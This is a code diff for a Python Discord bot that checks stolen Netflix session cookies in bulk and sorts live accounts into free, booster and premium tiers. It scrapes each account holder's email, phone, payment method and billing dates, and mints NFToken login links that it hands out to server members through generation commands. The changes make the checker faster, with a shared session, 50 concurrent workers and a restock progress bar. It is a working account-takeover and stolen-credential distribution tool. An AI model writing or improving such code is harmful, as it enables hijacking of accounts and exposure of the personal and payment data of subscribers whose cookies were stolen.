@@ -258,7 +258,7 @@ def parse_cookie_file(raw: str) -> list[str]:
     return accounts
 
 # ==========================================
-# 3. NETFLIX COOKIE CHECKER (ENHANCED FULL INFO)
+# 3. NETFLIX COOKIE CHECKER (OPTIMIZED)
 # ==========================================
 
 def normalize_plan_key(value: str | None) -> str:
@@ -289,7 +289,6 @@ def _extract_graphql_info(text: str) -> dict:
         profiles = growth.get("profiles") or []
         profiles_names = [_decode(p.get("name")) for p in profiles if isinstance(p, dict) and p.get("name")]
         profiles_str = ", ".join(filter(None, profiles_names)) if profiles_names else None
-        # Email extraction
         email = None
         email_verified = None
         growth_email = (current_profile.get("growthEmail") or {})
@@ -304,7 +303,6 @@ def _extract_graphql_info(text: str) -> dict:
                 if email:
                     email_verified = _decode(ge.get("isVerified"))
                     break
-        # Payment
         payment_methods = growth.get("growthPaymentMethods") or []
         payment = None
         card = None
@@ -322,7 +320,6 @@ def _extract_graphql_info(text: str) -> dict:
                 payment = _decode((pm.get("paymentOptionLogo") or {}).get("paymentOptionLogo"))
                 if not payment:
                     payment = _decode(pm.get("displayText"))
-        # Phone
         phone = None
         local_phone = growth.get("growthLocalizablePhoneNumber") or {}
         raw_phone = local_phone.get("rawPhoneNumber") or {}
@@ -330,10 +327,8 @@ def _extract_graphql_info(text: str) -> dict:
         phone_country = _decode(raw_phone.get("countryCode") if isinstance(raw_phone, dict) else None)
         if phone_digits:
             phone = normalize_phone_number(phone_digits, phone_country)
-        # Member since, next billing
         member_since = _decode(growth.get("memberSince"))
         next_billing = _decode((growth.get("nextBillingDate") or {}).get("localDate"))
-        # Extra member
         extra_member = None
         features = []
         for f in (plan.get("availableFeatures") or []):
@@ -341,7 +336,6 @@ def _extract_graphql_info(text: str) -> dict:
                 features.append(str(f["type"]).upper())
         if "EXTRA_MEMBER" in features:
             extra_member = "Yes"
-        # Hold status
         hold = None
         hold_meta = growth.get("growthHoldMetadata") or {}
         if isinstance(hold_meta, dict):
@@ -353,7 +347,6 @@ def _extract_graphql_info(text: str) -> dict:
         if hold is None:
             if normalize_plan_key(_decode(growth.get("membershipStatus"))) == "current_member":
                 hold = "No"
-        # User GUID
         user_guid = _decode(growth.get("ownerGuid") or current_profile.get("guid"))
 
         return {
@@ -539,12 +532,18 @@ def _is_subscribed(info: dict) -> bool:
         return True
     return False
 
+# ---------- OPTIMISED CHECKER (reusable session) ----------
+_session_pool = requests.Session()
+_adapter = requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=50)
+_session_pool.mount("https://", _adapter)
+_session_pool.mount("http://", _adapter)
+
 def check_nf_cookie(cookie_text: str) -> dict:
     cookies = netscape_to_dict(cookie_text)
     if "NetflixId" not in cookies:
         return {"ok": False, "reason": "Missing NetflixId cookie."}
 
-    s = requests.Session()
+    s = _session_pool
     s.cookies.update(cookies)
     headers = {
         "User-Agent": (
@@ -558,7 +557,7 @@ def check_nf_cookie(cookie_text: str) -> dict:
 
     try:
         r = s.get("https://www.netflix.com/account/membership",
-                  headers=headers, timeout=20, allow_redirects=True)
+                  headers=headers, timeout=8, allow_redirects=True)
     except requests.exceptions.Timeout:
         return {"ok": False, "reason": "Request timed out."}
     except Exception as e:
@@ -568,7 +567,6 @@ def check_nf_cookie(cookie_text: str) -> dict:
         return {"ok": False, "reason": f"HTTP {r.status_code}"}
 
     text = r.text
-
     graphql_info = _extract_graphql_info(text)
     html_info = _extract_html_info(text)
     info = _merge_info(graphql_info, html_info)
@@ -583,7 +581,7 @@ def check_nf_cookie(cookie_text: str) -> dict:
 
     subscribed = _is_subscribed(info)
     if subscribed:
-        nft, nft_err = create_nftoken(cookie_text, attempts=2)
+        nft, nft_err = create_nftoken_fast(cookie_text)
         if not nft:
             return {"ok": False, "reason": f"NFToken failed: {nft_err}"}
         return {
@@ -599,6 +597,24 @@ def check_nf_cookie(cookie_text: str) -> dict:
 
     return {"ok": False, "reason": f"No active subscription ({info.get('membershipStatus', 'unknown')})."}
 
+def create_nftoken_fast(cookie_text: str) -> tuple[dict | None, str | None]:
+    nid = _decode(netscape_to_dict(cookie_text).get("NetflixId"))
+    if not nid:
+        return None, "Missing NetflixId"
+    headers = {**_NF_HEADERS, "Cookie": f"NetflixId={nid}"}
+    try:
+        r = _session_pool.get(_NF_API_URL, params=_NF_PARAMS, headers=headers,
+                              timeout=10, verify=False)
+        if r.status_code != 200:
+            return None, f"NFToken HTTP {r.status_code}"
+        node = (((r.json().get("value") or {}).get("account") or {})
+                .get("token") or {}).get("default") or {}
+        token = _decode(node.get("token"))
+        if token:
+            return {"token": token, "expires_at_utc": _expiry_str(node.get("expires"))}, None
+        return None, "Token field missing"
+    except Exception as e:
+        return None, str(e)
 
 _PREMIUM_PLAN_KEYS = {
     "premium", "premium_extra_member", "extra_member_premium",
@@ -654,7 +670,7 @@ def extract_cookies_from_zip(zip_bytes: bytes) -> tuple[list[str], list[str]]:
     return accounts, summary
 
 # ==========================================
-# 4. NFTOKEN EXTRACTION & LINK GENERATION
+# 4. NFTOKEN EXTRACTION
 # ==========================================
 
 _NF_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
@@ -709,54 +725,15 @@ def _expiry_str(expires) -> str | None:
     except Exception:
         return str(expires)
 
-def create_nftoken(cookie_text: str, attempts: int = 3) -> tuple[dict | None, str | None]:
-    nid = _decode(netscape_to_dict(cookie_text).get("NetflixId"))
-    if not nid:
-        return None, "Missing NetflixId — cannot create NFToken."
-
-    headers = {**_NF_HEADERS, "Cookie": f"NetflixId={nid}"}
-    last_err = "NFToken API error"
-
-    for _ in range(max(1, attempts)):
-        try:
-            r = requests.get(_NF_API_URL, params=_NF_PARAMS, headers=headers,
-                             timeout=30, verify=False)
-            if r.status_code == 403:
-                return None, "NetflixId rejected (403) — may be region-locked."
-            if r.status_code == 429:
-                return None, "Rate-limited by Netflix iOS API (429). Try later."
-            if r.status_code != 200:
-                last_err = f"NFToken API returned HTTP {r.status_code}."
-                continue
-
-            node = (
-                (((r.json().get("value") or {}).get("account") or {})
-                 .get("token") or {}).get("default") or {}
-            )
-            token = _decode(node.get("token"))
-            if token:
-                return {"token": token, "expires_at_utc": _expiry_str(node.get("expires"))}, None
-
-            last_err = "Token field missing in API response."
-
-        except requests.exceptions.Timeout:
-            last_err = "NFToken request timed out."
-        except requests.exceptions.ConnectionError:
-            last_err = "NFToken API connection error."
-        except Exception as e:
-            last_err = f"Unexpected error: {e}"
-
-    return None, last_err
-
 def build_links_for_tier(token: str, tier: str) -> list[tuple[str, str]]:
     t = _decode(token)
     if not t:
         return []
-    links = [("🖥️ PC Login", f"[Click here to login](https://netflix.com/?nftoken={t})")]
+    links = [("🖥️ PC Login", f"[Click here](https://netflix.com/?nftoken={t})")]
     if tier in ("booster", "premium"):
-        links.append(("📱 Mobile Login", f"[Click here to login](https://netflix.com/unsupported?nftoken={t})"))
+        links.append(("📱 Mobile Login", f"[Click here](https://netflix.com/unsupported?nftoken={t})"))
     if tier == "premium":
-        links.append(("📺 TV Login", f"[Click here to login](https://netflix.com/tv8?nftoken={t})"))
+        links.append(("📺 TV Login", f"[Click here](https://netflix.com/tv8?nftoken={t})"))
     return links
 
 # ==========================================
@@ -773,19 +750,23 @@ def in_channel(channel_id: int):
     return app_commands.check(predicate)
 
 # ==========================================
-# 7. GENERATOR COG
+# 7. GENERATOR COG (WITH PROGRESS BAR EMBED)
 # ==========================================
 
-RESTOCK_IMAGE_URL = "https://i.imgur.com/your_image.png"   # <-- replace with actual image link
+RESTOCK_IMAGE_URL = "https://i.imgur.com/your_image.png"   # replace with your image
+
+def _progress_bar(completed: int, total: int, length: int = 20) -> str:
+    if total == 0:
+        return "░" * length
+    filled = int(completed / total * length)
+    return "█" * filled + "░" * (length - filled)
 
 class GeneratorCog(commands.Cog):
     def __init__(self, bot: commands.Bot):
         self.bot = bot
 
-    async def _generate(
-        self, interaction: discord.Interaction,
-        tier: str, label: str, emoji: str,
-    ) -> None:
+    async def _generate(self, interaction: discord.Interaction,
+                        tier: str, label: str, emoji: str) -> None:
         await interaction.response.defer(ephemeral=True)
         loop = asyncio.get_running_loop()
 
@@ -821,9 +802,7 @@ class GeneratorCog(commands.Cog):
                 continue
 
             links = build_links_for_tier(nft["token"], tier)
-            link_lines = []
-            for label, url in links:
-                link_lines.append(f"{label}: {url}")
+            link_lines = [f"{lbl}: {url}" for lbl, url in links]
             links_text = "\n".join(link_lines)
 
             dm_embed = discord.Embed(
@@ -911,7 +890,7 @@ class GeneratorCog(commands.Cog):
             ephemeral=True,
         )
 
-    # ---------- Generation commands (cooldown AFTER channel check) ----------
+    # ---------- GEN COMMANDS (cooldown AFTER channel check) ----------
     @app_commands.command(name="fgen", description="🆓 Generate a Free Netflix account")
     @app_commands.checks.cooldown(1, 86400, key=lambda i: i.user.id if i.user.id != OWNER_ID else object())
     @in_channel(FGEN_CHANNEL_ID)
@@ -930,7 +909,7 @@ class GeneratorCog(commands.Cog):
     async def pgen(self, interaction: discord.Interaction):
         await self._generate(interaction, "premium", "Premium", "💎")
 
-    # ---------- Restock command ----------
+    # ---------- RESTOCK WITH PROGRESS BAR EMBED ----------
     @app_commands.command(
         name="restock",
         description="[ADMIN] Upload up to 5 files (.txt/.json/.zip) — auto-extracted, checked & sorted",
@@ -967,7 +946,6 @@ class GeneratorCog(commands.Cog):
                 return await interaction.followup.send(
                     f"❌ Could not read `{att.filename}`: {e}", ephemeral=True
                 )
-
             if att.filename.lower().endswith(".zip"):
                 found, inner_summary = extract_cookies_from_zip(raw_bytes)
                 all_accounts.extend(found)
@@ -987,14 +965,19 @@ class GeneratorCog(commands.Cog):
                 ephemeral=True,
             )
 
-        await interaction.followup.send(
-            f"⏳ Scanning **{len(all_accounts)}** account(s) from **{len(attachments)}** file(s)… Please wait.",
-            ephemeral=True,
+        # ---------- PROGRESS EMBED ----------
+        progress_embed = discord.Embed(
+            title="⏳ Restocking Netflix Accounts",
+            description=f"Scanned: 0/{len(all_accounts)}\n[{'░'*20}] 0%",
+            color=0x2F3136  # dark gray
         )
+        progress_embed.set_footer(text="Please wait…")
+        progress_msg = await interaction.followup.send(embed=progress_embed, ephemeral=True)
+        # ------------------------------------
 
         loop = asyncio.get_running_loop()
 
-        # Deduplicate against existing IDs
+        # Deduplication
         existing_ids: set[str] = await loop.run_in_executor(None, db.existing_netflix_ids)
         seen_ids = set(existing_ids)
         unique = []
@@ -1008,25 +991,39 @@ class GeneratorCog(commands.Cog):
                 if nid:
                     seen_ids.add(nid)
 
-        # High-speed parallel checking (100 threads)
-        MAX_WORKERS = 100
-        SEM_LIMIT   = 100
+        total = len(unique)
+        MAX_WORKERS = 50
+        SEM_LIMIT   = 50
         executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
         sem = asyncio.Semaphore(SEM_LIMIT)
 
-        async def _check(cookie: str) -> dict:
-            async with sem:
-                return await loop.run_in_executor(executor, check_nf_cookie, cookie)
+        completed = 0
+        lock = asyncio.Lock()
 
-        try:
-            results = await asyncio.gather(*[_check(c) for c in unique])
-        finally:
-            executor.shutdown(wait=False)
+        async def _check(cookie: str) -> dict:
+            nonlocal completed
+            async with sem:
+                result = await loop.run_in_executor(executor, check_nf_cookie, cookie)
+            async with lock:
+                completed += 1
+                if completed % 50 == 0 or completed == total:
+                    pct = int(completed / total * 100)
+                    bar = _progress_bar(completed, total)
+                    new_embed = discord.Embed(
+                        title="⏳ Restocking Netflix Accounts",
+                        description=f"Scanned: {completed}/{total}\n[{bar}] {pct}%",
+                        color=0x2F3136
+                    )
+                    new_embed.set_footer(text="Please wait…")
+                    await progress_msg.edit(embed=new_embed)
+            return result
+
+        results = await asyncio.gather(*[_check(c) for c in unique])
+        executor.shutdown(wait=False)
 
         sorted_cookies = {"free": [], "booster": [], "premium": []}
         dead = 0
         on_hold = 0
-
         for cookie, res in zip(unique, results):
             if res["ok"]:
                 full_info = res.get("full_info", {})
@@ -1038,18 +1035,18 @@ class GeneratorCog(commands.Cog):
             else:
                 dead += 1
 
-        # Save to DB and get final stock
+        # Save to DB
         data = await loop.run_in_executor(None, db.get_all)
         for t in ("free", "booster", "premium"):
             data["nf"][t].extend(sorted_cookies[t])
         save_ok = await loop.run_in_executor(None, db.save, data)
         final_stock = await loop.run_in_executor(None, db.stock)
 
-        # =========== ADMIN EMBED (unchanged – may still use “cookies”) ===========
         files_value = "\n".join(file_names)
         if len(files_value) > 900:
             files_value = files_value[:900] + "\n…"
 
+        # Admin summary embed (replaces progress embed)
         admin_embed = discord.Embed(
             title="✅ Restock Complete — Auto-sorted",
             color=discord.Color.green() if save_ok else discord.Color.orange(),
@@ -1066,16 +1063,14 @@ class GeneratorCog(commands.Cog):
         if not save_ok:
             admin_embed.add_field(name="⚠️ Warning", value="Supabase write may have failed.", inline=False)
 
-        await interaction.followup.send(embed=admin_embed)
+        await progress_msg.edit(content=None, embed=admin_embed)
 
-        # =========== PUBLIC RESTOCK CHANNEL EMBED (uses “accounts” only) ===========
+        # Public restock channel embed (unchanged)
         restock_channel = self.bot.get_channel(RESTOCK_CHANNEL_ID)
         if restock_channel:
-            # Build file list without “cookies” word
             pub_file_list = "\n".join(file_names).replace("cookies", "accounts")
             if len(pub_file_list) > 900:
                 pub_file_list = pub_file_list[:900] + "\n…"
-
             pub_embed = discord.Embed(
                 title="✅ Netflix Restock Successfully",
                 color=0xd2af26,
@@ -1106,13 +1101,12 @@ class GeneratorCog(commands.Cog):
                     ephemeral=True
                 )
 
-    # ---------- Stock command ----------
+    # ---------- STOCK COMMAND ----------
     @app_commands.command(name="stock", description="📦 Check Netflix account stock levels")
     @in_channel(ADMIN_CHANNEL_ID)
     async def stock(self, interaction: discord.Interaction):
         await interaction.response.defer(ephemeral=True)
         counts = await asyncio.get_running_loop().run_in_executor(None, db.stock)
-
         embed = discord.Embed(title="📦 Netflix Account Vault", color=discord.Color.dark_theme())
         for label, key in [("💎 Premium", "premium"), ("🚀 Booster", "booster"), ("🆓 Free", "free")]:
             c = counts[key]
@@ -1124,88 +1118,58 @@ class GeneratorCog(commands.Cog):
         embed.set_footer(text=f"Total: {sum(counts.values())} accounts")
         await interaction.followup.send(embed=embed, ephemeral=True)
 
-    # ---------- /removecookies (admin only, uses “accounts” in public embeds) ----------
+    # ---------- /removecookies ----------
     @app_commands.command(
         name="removecookies",
         description="[ADMIN] Remove accounts from the vault by uploading a file with the accounts to delete"
     )
     @app_commands.checks.has_permissions(administrator=True)
     @in_channel(ADMIN_CHANNEL_ID)
-    async def removecookies(
-        self,
-        interaction: discord.Interaction,
-        file: discord.Attachment
-    ):
+    async def removecookies(self, interaction: discord.Interaction, file: discord.Attachment):
         await interaction.response.defer(ephemeral=True)
-
         if not file.filename.lower().endswith((".txt", ".json")):
             return await interaction.followup.send(
-                "❌ Only `.txt` / `.json` files are accepted.",
-                ephemeral=True
+                "❌ Only `.txt` / `.json` files are accepted.", ephemeral=True
             )
-
         try:
             raw_bytes = await file.read()
             raw = raw_bytes.decode("utf-8", errors="ignore")
         except Exception as e:
-            return await interaction.followup.send(
-                f"❌ Could not read `{file.filename}`: {e}",
-                ephemeral=True
-            )
-
+            return await interaction.followup.send(f"❌ Could not read `{file.filename}`: {e}", ephemeral=True)
         accounts = parse_cookie_file(raw)
         if not accounts:
-            return await interaction.followup.send(
-                "❌ No valid Netflix accounts found in the file.",
-                ephemeral=True
-            )
-
+            return await interaction.followup.send("❌ No valid Netflix accounts found in the file.", ephemeral=True)
         ids_to_remove = set()
-        for cookie_text in accounts:
-            nid = netscape_to_dict(cookie_text).get("NetflixId", "").strip()
+        for ct in accounts:
+            nid = netscape_to_dict(ct).get("NetflixId", "").strip()
             if nid:
                 ids_to_remove.add(nid)
-
         if not ids_to_remove:
-            return await interaction.followup.send(
-                "❌ No NetflixId could be extracted from the uploaded accounts.",
-                ephemeral=True
-            )
-
+            return await interaction.followup.send("❌ No NetflixId could be extracted.", ephemeral=True)
         loop = asyncio.get_running_loop()
         data = await loop.run_in_executor(None, db.get_all)
-        removed_count = 0
+        removed = 0
         for tier in ("free", "booster", "premium"):
-            original = data["nf"][tier]
             new_list = []
-            for cookie_text in original:
-                nid = netscape_to_dict(cookie_text).get("NetflixId", "").strip()
+            for ct in data["nf"][tier]:
+                nid = netscape_to_dict(ct).get("NetflixId", "").strip()
                 if nid in ids_to_remove:
-                    removed_count += 1
+                    removed += 1
                 else:
-                    new_list.append(cookie_text)
+                    new_list.append(ct)
             data["nf"][tier] = new_list
-
-        if removed_count == 0:
-            return await interaction.followup.send(
-                "ℹ️ No matching accounts found in the vault.",
-                ephemeral=True
-            )
-
+        if removed == 0:
+            return await interaction.followup.send("ℹ️ No matching accounts found.", ephemeral=True)
         success = await loop.run_in_executor(None, db.save, data)
-        status = "✅" if success else "⚠️ (save may have failed)"
-
         embed = discord.Embed(
             title="🗑️ Accounts Removed",
-            description=f"{status} Removed **{removed_count}** account(s) from the vault.",
-            color=discord.Color.orange() if not success else discord.Color.green()
+            description=f"{'✅' if success else '⚠️'} Removed **{removed}** account(s).",
+            color=discord.Color.green() if success else discord.Color.orange()
         )
         embed.add_field(name="📂 File", value=file.filename, inline=False)
-        embed.add_field(name="🔑 NetflixIds to remove", value=f"`{len(ids_to_remove)}` unique", inline=True)
-
         await interaction.followup.send(embed=embed, ephemeral=True)
 
-    # ---------- /export (new, export only) ----------
+    # ---------- /export ----------
     @app_commands.command(
         name="export",
         description="[ADMIN] Export all vault accounts as a tier-wise zip (does not clear)"
@@ -1214,10 +1178,8 @@ class GeneratorCog(commands.Cog):
     @in_channel(ADMIN_CHANNEL_ID)
     async def export(self, interaction: discord.Interaction):
         await interaction.response.defer(ephemeral=True)
-
         loop = asyncio.get_running_loop()
         data = await loop.run_in_executor(None, db.get_all)
-
         tiers = {
             "free": data["nf"].get("free", []),
             "booster": data["nf"].get("booster", []),
@@ -1225,51 +1187,30 @@ class GeneratorCog(commands.Cog):
         }
         total = sum(len(v) for v in tiers.values())
         if total == 0:
-            return await interaction.followup.send("❌ The vault is empty.", ephemeral=True)
-
-        # Build zip
+            return await interaction.followup.send("❌ Vault is empty.", ephemeral=True)
         zip_buffer = io.BytesIO()
         with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
-            for tier_name, cookies in tiers.items():
+            for tname, cookies in tiers.items():
                 if cookies:
-                    content = "\n\n".join(cookies)
-                    zf.writestr(f"{tier_name}.txt", content)
-
+                    zf.writestr(f"{tname}.txt", "\n\n".join(cookies))
         zip_buffer.seek(0)
         timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
-        file = discord.File(
-            fp=zip_buffer,
-            filename=f"vault_export_{timestamp}.zip",
-            description="Full vault export (tier-wise)"
-        )
-
-        # DM the admin
+        file = discord.File(fp=zip_buffer, filename=f"vault_export_{timestamp}.zip")
         try:
             await interaction.user.send(
-                f"📦 **Vault Export**\n"
-                f"Total accounts: **{total}**\n"
-                f"Breakdown: Premium {len(tiers['premium'])}, Booster {len(tiers['booster'])}, Free {len(tiers['free'])}\n"
-                f"Attached zip contains separate text files for each tier.",
+                f"📦 **Vault Export**\nTotal: **{total}** accounts\n"
+                f"Premium {len(tiers['premium'])}, Booster {len(tiers['booster'])}, Free {len(tiers['free'])}",
                 file=file
             )
-            dm_ok = True
+            await interaction.followup.send(embed=discord.Embed(
+                title="📤 Vault Exported",
+                description=f"✅ **{total}** accounts exported to your DMs.",
+                color=discord.Color.blue()
+            ), ephemeral=True)
         except discord.Forbidden:
-            dm_ok = False
+            await interaction.followup.send("❌ I couldn't DM you. Enable DMs and try again.", ephemeral=True)
 
-        if not dm_ok:
-            return await interaction.followup.send(
-                "❌ I couldn't DM you. Please enable DMs and try again.",
-                ephemeral=True
-            )
-
-        embed = discord.Embed(
-            title="📤 Vault Exported",
-            description=f"✅ **{total}** account(s) exported. Zip sent to your DMs.",
-            color=discord.Color.blue()
-        )
-        await interaction.followup.send(embed=embed, ephemeral=True)
-
-    # ---------- /exportandclear (existing, uses “accounts” wording) ----------
+    # ---------- /exportandclear ----------
     @app_commands.command(
         name="exportandclear",
         description="[ADMIN] Export all vault accounts (tier-wise zip) and then empty the entire vault"
@@ -1278,10 +1219,8 @@ class GeneratorCog(commands.Cog):
     @in_channel(ADMIN_CHANNEL_ID)
     async def exportandclear(self, interaction: discord.Interaction):
         await interaction.response.defer(ephemeral=True)
-
         loop = asyncio.get_running_loop()
         data = await loop.run_in_executor(None, db.get_all)
-
         tiers = {
             "free": data["nf"].get("free", []),
             "booster": data["nf"].get("booster", []),
@@ -1289,63 +1228,38 @@ class GeneratorCog(commands.Cog):
         }
         total = sum(len(v) for v in tiers.values())
         if total == 0:
-            return await interaction.followup.send("❌ The vault is already empty.", ephemeral=True)
-
+            return await interaction.followup.send("❌ Vault is already empty.", ephemeral=True)
         zip_buffer = io.BytesIO()
         with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
-            for tier_name, cookies in tiers.items():
+            for tname, cookies in tiers.items():
                 if cookies:
-                    content = "\n\n".join(cookies)
-                    zf.writestr(f"{tier_name}.txt", content)
-
+                    zf.writestr(f"{tname}.txt", "\n\n".join(cookies))
         zip_buffer.seek(0)
         timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
-        file = discord.File(
-            fp=zip_buffer,
-            filename=f"vault_export_{timestamp}.zip",
-            description="Full vault export (tier-wise)"
-        )
-
+        file = discord.File(fp=zip_buffer, filename=f"vault_export_{timestamp}.zip")
         try:
             await interaction.user.send(
-                f"📦 **Vault Export**\n"
-                f"Total accounts: **{total}**\n"
-                f"Breakdown: Premium {len(tiers['premium'])}, Booster {len(tiers['booster'])}, Free {len(tiers['free'])}\n"
-                f"Attached zip contains separate text files for each tier.",
+                f"📦 **Vault Export**\nTotal: **{total}** accounts\n"
+                f"Premium {len(tiers['premium'])}, Booster {len(tiers['booster'])}, Free {len(tiers['free'])}",
                 file=file
             )
-            dm_ok = True
         except discord.Forbidden:
-            dm_ok = False
-
-        if not dm_ok:
-            return await interaction.followup.send(
-                "❌ I couldn't DM you. Please enable DMs and try again.",
-                ephemeral=True
-            )
-
+            return await interaction.followup.send("❌ I couldn't DM you. Enable DMs and try again.", ephemeral=True)
         for t in ("free", "booster", "premium"):
             data["nf"][t] = []
         success = await loop.run_in_executor(None, db.save, data)
-
         embed = discord.Embed(
             title="🗑️ Vault Cleared",
             description=f"✅ **{total}** account(s) removed. Zip sent to your DMs.",
             color=discord.Color.green() if success else discord.Color.orange()
         )
-        if not success:
-            embed.add_field(name="⚠️ Warning", value="Supabase write may have failed.")
         await interaction.followup.send(embed=embed, ephemeral=True)
-
         log_ch = self.bot.get_channel(RESTOCK_CHANNEL_ID)
         if log_ch:
             try:
-                await log_ch.send(
-                    f"🗑️ **Vault cleared** by {interaction.user.mention} — {total} accounts removed."
-                )
-            except Exception:
+                await log_ch.send(f"🗑️ **Vault cleared** by {interaction.user.mention} — {total} accounts removed.")
+            except:
                 pass
-
 
 # ==========================================
 # 8. BOT CLASS (with anti‑429 fix)
